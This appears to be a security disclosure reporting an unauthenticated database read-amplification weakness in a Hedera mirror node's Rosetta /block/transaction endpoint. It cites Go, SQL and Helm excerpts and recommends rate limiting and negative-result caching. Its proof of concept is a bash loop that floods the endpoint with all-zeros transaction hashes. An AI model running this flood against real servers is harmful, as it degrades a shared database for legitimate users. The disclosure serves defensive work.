### Title
Unauthenticated DB Read Amplification via All-Zeros Transaction Hash in `BlockTransaction()`

### Summary
The `/block/transaction` Rosetta endpoint accepts any syntactically valid hex string as a transaction hash with no application-level rate limiting or negative-result caching. An unprivileged attacker can supply a valid block identifier paired with an all-zeros (or any non-existent) hex transaction hash, causing `FindByHashInBlock()` to unconditionally execute a full DB query that always returns zero rows. This can be repeated at will to sustain DB read amplification.

### Finding Description

**Code path:**

`BlockTransaction()` in `rosetta/app/services/block_service.go` (lines 77–102):

```
h := tools.SafeRemoveHexPrefix(request.BlockIdentifier.Hash)
block, err := s.FindByIdentifier(ctx, request.BlockIdentifier.Index, h)   // DB hit 1
...
transaction, err := s.FindByHashInBlock(
    ctx,
    request.TransactionIdentifier.Hash,   // attacker-controlled
    block.ConsensusStartNanos,
    block.ConsensusEndNanos,
)                                                                           // DB hit 2
``` [1](#0-0) 

`FindByHashInBlock()` in `rosetta/app/persistence/transaction.go` (lines 173–208):

```go
transactionHash, err := hex.DecodeString(tools.SafeRemoveHexPrefix(hashStr))
if err != nil {
    return nil, hErrors.ErrInvalidTransactionIdentifier   // only guard
}
// DB query always executes:
if err = db.Raw(
    selectTransactionsByHashInTimestampRange,
    sql.Named("hash", transactionHash),
    ...
).Find(&transactions).Error; ...
``` [2](#0-1) 

The SQL executed is:

```sql
SELECT ... FROM transaction t
WHERE consensus_timestamp >= @start AND consensus_timestamp <= @end
AND transaction_hash = @hash
``` [3](#0-2) 

**Root cause:** The sole validation is `hex.DecodeString`, which succeeds for any valid hex string including `"0x0000000000000000000000000000000000000000000000000000000000000000"`. There is no check that the hash is non-zero, no negative-result cache, and no application-level rate limiting in the Rosetta server itself.

**Failed assumption:** The code assumes callers will only supply hashes that plausibly exist. No guard enforces this.

**Server middleware stack** (`rosetta/main.go` lines 217–219) is only `MetricsMiddleware → TracingMiddleware → CorsMiddleware` — no auth, no rate limiting at the application layer. [4](#0-3) 

### Impact Explanation

Each crafted request causes two DB queries: one block lookup and one guaranteed-miss transaction hash scan over the `transaction` table filtered by timestamp range. With no application-level throttle, an attacker can sustain this at the rate the network allows, amplifying DB read load proportionally. Under high concurrency this degrades DB performance for all legitimate users of the mirror node (REST API, web3, etc.) that share the same PostgreSQL instance.

### Likelihood Explanation

**Preconditions:** The attacker needs only a valid block index and block hash, both of which are publicly available from the `/block` endpoint or any block explorer — no credentials required. The transaction hash can be any syntactically valid hex string (e.g., 64 hex zeros). The Rosetta API is designed to be publicly accessible.

**Feasibility:** A single script with `curl` or any HTTP client suffices. The Traefik Helm chart values define a rate limit of 10 req/s per *host* (not per IP), which is optional infrastructure-level config and not guaranteed to be deployed in all environments. [5](#0-4) 

Even when deployed, 10 req/s of guaranteed-miss DB queries is non-trivial, and multiple source hosts bypass the per-host limit entirely.

### Recommendation

1. **Application-level rate limiting:** Add a per-IP rate limiter middleware directly in the Rosetta Go server (e.g., `golang.org/x/time/rate`) so the limit is enforced regardless of infrastructure deployment.
2. **Negative-result caching:** Cache `(blockHash, txHash) → not-found` results with a short TTL (e.g., 5–30 seconds) to collapse repeated identical miss queries.
3. **Hash content validation:** Optionally reject all-zero hashes or hashes shorter than the expected transaction hash length before hitting the DB, returning `ErrInvalidTransactionIdentifier` immediately.

### Proof of Concept

```bash
# Step 1: obtain a valid block identifier
BLOCK=$(curl -s -X POST http://<rosetta-host>/block \
  -H 'Content-Type: application/json' \
  -d '{"network_identifier":{"blockchain":"Hedera","network":"mainnet"},
       "block_identifier":{}}')

INDEX=$(echo $BLOCK | jq '.block.block_identifier.index')
HASH=$(echo $BLOCK | jq -r '.block.block_identifier.hash')

# Step 2: flood with all-zeros transaction hash (valid hex, guaranteed miss)
while true; do
  curl -s -X POST http://<rosetta-host>/block/transaction \
    -H 'Content-Type: application/json' \
    -d "{\"network_identifier\":{\"blockchain\":\"Hedera\",\"network\":\"mainnet\"},
         \"block_identifier\":{\"index\":$INDEX,\"hash\":\"$HASH\"},
         \"transaction_identifier\":{\"hash\":\"0x0000000000000000000000000000000000000000000000000000000000000000\"}}" &
done
```

Each iteration triggers `FindByHashInBlock()` → full DB scan on `transaction` table with timestamp range filter → zero rows returned → `ErrTransactionNotFound`. No authentication or special privilege required.

### Citations

**File:** rosetta/app/services/block_service.go (L81-92)
```go
	h := tools.SafeRemoveHexPrefix(request.BlockIdentifier.Hash)
	block, err := s.FindByIdentifier(ctx, request.BlockIdentifier.Index, h)
	if err != nil {
		return nil, err
	}

	transaction, err := s.FindByHashInBlock(
		ctx,
		request.TransactionIdentifier.Hash,
		block.ConsensusStartNanos,
		block.ConsensusEndNanos,
	)
```

**File:** rosetta/app/persistence/transaction.go (L28-59)
```go
const (
	andTransactionHashFilter  = " and transaction_hash = @hash"
	orderByConsensusTimestamp = " order by consensus_timestamp"
	// selectTransactionsInTimestampRange selects the transactions with its crypto transfers in json.
	selectTransactionsInTimestampRange = `select
                                            t.consensus_timestamp,
                                            t.entity_id,
                                            t.itemized_transfer,
                                            t.memo,
                                            t.payer_account_id,
                                            t.result,
                                            t.transaction_hash as hash,
                                            t.type,
                                            coalesce((
                                              select json_agg(json_build_object(
                                                'account_id', entity_id,
                                                'amount', amount) order by entity_id)
                                              from crypto_transfer
                                              where consensus_timestamp = t.consensus_timestamp and
                                                (errata is null or errata <> 'DELETE')
                                            ), '[]') as crypto_transfers,
                                            coalesce((
                                              select json_agg(json_build_object(
                                                'account_id', account_id,
                                                'amount', amount) order by account_id)
                                              from staking_reward_transfer
                                              where consensus_timestamp = t.consensus_timestamp
                                            ), '[]') as staking_reward_payouts
                                          from transaction t
                                          where consensus_timestamp >= @start and consensus_timestamp <= @end`
	selectTransactionsByHashInTimestampRange  = selectTransactionsInTimestampRange + andTransactionHashFilter
	selectTransactionsInTimestampRangeOrdered = selectTransactionsInTimestampRange + orderByConsensusTimestamp
```

**File:** rosetta/app/persistence/transaction.go (L180-196)
```go
	transactionHash, err := hex.DecodeString(tools.SafeRemoveHexPrefix(hashStr))
	if err != nil {
		return nil, hErrors.ErrInvalidTransactionIdentifier
	}

	db, cancel := tr.dbClient.GetDbWithContext(ctx)
	defer cancel()

	if err = db.Raw(
		selectTransactionsByHashInTimestampRange,
		sql.Named("hash", transactionHash),
		sql.Named("start", consensusStart),
		sql.Named("end", consensusEnd),
	).Find(&transactions).Error; err != nil {
		log.Errorf(databaseErrorFormat, hErrors.ErrDatabaseError.Message, err)
		return nil, hErrors.ErrDatabaseError
	}
```

**File:** rosetta/main.go (L217-219)
```go
	metricsMiddleware := middleware.MetricsMiddleware(router)
	tracingMiddleware := middleware.TracingMiddleware(metricsMiddleware)
	corsMiddleware := server.CorsMiddleware(tracingMiddleware)
```

**File:** charts/hedera-mirror-rosetta/values.yaml (L157-160)
```yaml
  - rateLimit:
      average: 10
      sourceCriterion:
        requestHost: true
```
